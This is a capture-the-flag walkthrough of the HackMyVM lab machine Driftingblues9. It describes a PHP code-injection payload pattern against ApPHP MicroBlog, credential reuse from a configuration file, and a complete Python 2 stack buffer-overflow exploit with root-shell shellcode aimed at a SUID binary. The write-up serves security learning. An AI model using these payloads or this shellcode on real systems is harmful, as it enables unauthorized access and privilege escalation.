# Driftingblues9

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Driftingblues9 | tasiyanci | Beginner | HackMyVM |

**Summary:** Driftingblues9 is a beginner-level Linux machine focused on web application exploitation and binary buffer overflow techniques. The attack path begins with identifying a vulnerable ApPHP MicroBlog v.1.0.1 installation running on Apache/2.4.10 (Debian). Exploiting a Remote Code Execution (RCE) vulnerability in the blogging platform allows initial access as the `www-data` user. Database credentials extracted from the application's configuration file enable lateral movement to the `clapton` user account. The privilege escalation vector involves exploiting a custom SUID binary vulnerable to a 32-bit stack-based buffer overflow, ultimately granting root access. This machine serves as an excellent introduction to web exploitation, credential reuse patterns, and classical buffer overflow attacks on x86 architecture.

### Vulnerability Research & Exploitation

A search for "ApPHP MicroBlog 1.0.1 exploit" led to **[Exploit-DB #33070](https://www.exploit-db.com/exploits/33070)**, a Remote Code Execution (RCE) vulnerability. The vulnerability exists in the application's parameter handling, allowing PHP code injection through specially crafted URL parameters.

**Exploit Mechanism:**
The exploit abuses improper input validation by injecting PHP code into a parameter, then using base64 encoding to bypass basic filters. The payload structure follows this pattern:
```
index.php?{char});echo(base64_decode('{payload}'))=/
```

### Buffer Overflow Exploitation

The exploitation strategy involves:
1. Overflowing the input buffer to overwrite the EIP (Extended Instruction Pointer)
2. Redirecting execution to a NOP sled
3. Executing shellcode that elevates privileges and spawns a root shell

**Exploit Code (Python 2):**

```python
clapton@debian:~$ cat /tmp/p.py
import struct
import sys

padding = "A" * 171
eip = struct.pack("<I", 0xbfe00000 + (3 * 1000))
nops = "\x90" * 30000

shellcode = (
    "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\xaa\xcd\x80"
    "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\xa4\xcd\x80"
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
    "\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
)

sys.stdout.write(padding + eip + nops + shellcode)
```

**Exploitation Breakdown:**

1. **Padding (171 bytes)**: "A" characters to reach the EIP offset
2. **EIP Overwrite**: `0xbfe03b98` (`0xbfe00000 + 3000`) - Points into the NOP sled on the stack
3. **NOP Sled (30,000 bytes)**: `\x90` instructions to increase landing zone reliability
4. **Shellcode (38 bytes)**:
   - **setresgid(0,0,0)** - Syscall 0xaa (170) to set real, effective, and saved GID to 0
   - **setresuid(0,0,0)** - Syscall 0xa4 (164) to set real, effective, and saved UID to 0
   - **execve("/bin/sh")** - Syscall 0x0b (11) to spawn a shell with root privileges

## Attack Chain Summary

1. **Reconnaissance**: Performed network discovery identifying target at 192.168.100.94, followed by comprehensive Nmap scan revealing Apache 2.4.10 hosting ApPHP MicroBlog, RPCbind on port 111, and status service on port 51568.

2. **Vulnerability Discovery**: Analyzed web application source code to identify exact version (ApPHP MicroBlog v.1.0.1), researched Exploit-DB and found CVE-referenced RCE vulnerability (EDB-ID 33070) exploiting improper parameter handling allowing PHP code injection.

3. **Exploitation**: Executed Python exploit script against `http://192.168.100.94/` achieving remote code execution as `www-data` user, extracted database credentials (`clapton:ya[REDACTED]`) from `include/base.inc.php` configuration file, and established reverse shell using BusyBox netcat with full TTY stabilization.

4. **Lateral Movement**: Enumerated system users from `/etc/passwd` identifying `clapton` (UID 1000), successfully performed credential reuse attack using database password `ya[REDACTED]` for system login via `su - clapton`, and captured user flag `F56[REDACTED]`.

5. **Privilege Escalation**: Discovered SUID binary `/home/clapton/input` owned by root with hint file indicating buffer overflow vulnerability, developed 32-bit stack-based buffer overflow exploit with 171-byte padding to reach EIP offset, used return address `0xbfe03b98` pointing to 30KB NOP sled containing privilege escalation shellcode (setresgid/setresuid/execve), executed brute-force loop to bypass ASLR achieving root shell, and captured root flag `04D[REDACTED]`.
